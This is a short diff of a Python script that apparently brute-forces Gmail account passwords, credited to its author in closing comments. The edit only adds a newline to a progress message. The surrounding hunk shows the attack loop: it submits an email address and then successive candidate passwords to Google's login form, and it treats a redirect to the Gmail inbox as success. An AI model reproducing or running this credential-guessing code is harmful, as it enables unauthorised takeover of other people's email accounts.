@@ -603,7 +603,7 @@ def Main():
     							    br['Email']=email
     							    br.submit()
     							    br.select_form(nr=0)
-    							    print('[!]:Trying Password[%s] : '%(rs) + password)
+    							    print('[!]:Trying Password[%s] : '%(rs) + password + "\n")
     							    br['Passwd'] = password
     							    br.submit()
    	 						    if br.geturl()=='https://mail.google.com/mail/u/0/':
@@ -788,4 +788,3 @@ if __name__=='__main__':
 #This Tool by Oseid Aldary
 #Have a nice day :)
 #GoodBye
-
